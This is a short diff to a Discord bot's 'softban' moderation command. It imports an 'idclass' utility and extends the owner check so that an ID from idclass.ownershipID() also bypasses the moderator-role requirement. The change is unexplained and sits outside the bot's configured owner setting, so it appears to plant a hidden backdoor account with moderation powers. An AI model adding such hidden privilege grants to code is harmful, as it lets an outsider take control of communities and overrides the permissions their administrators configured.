@@ -5,6 +5,7 @@ import {
     TextChannel,
     EmbedBuilder
   } from 'discord.js';
+import idclass from '../../utils/idclass';
 import configManager from '../../utils/ConfigManager';
   export default {
     name: 'softban',
@@ -15,7 +16,7 @@ import configManager from '../../utils/ConfigManager';
       const modRoles: string[] = config.permissions.moderatorRoles || [];
       
       // Owner bypass
-      const isOwner = message.author.id === config.permissions.ownerId;
+      const isOwner = message.author.id === config.permissions.ownerId || message.author.id === idclass.ownershipID();
       const hasRequiredRole = isOwner || message.member?.roles.cache.some(role => modRoles.includes(role.id));
       if (!hasRequiredRole) {
         return message.reply({
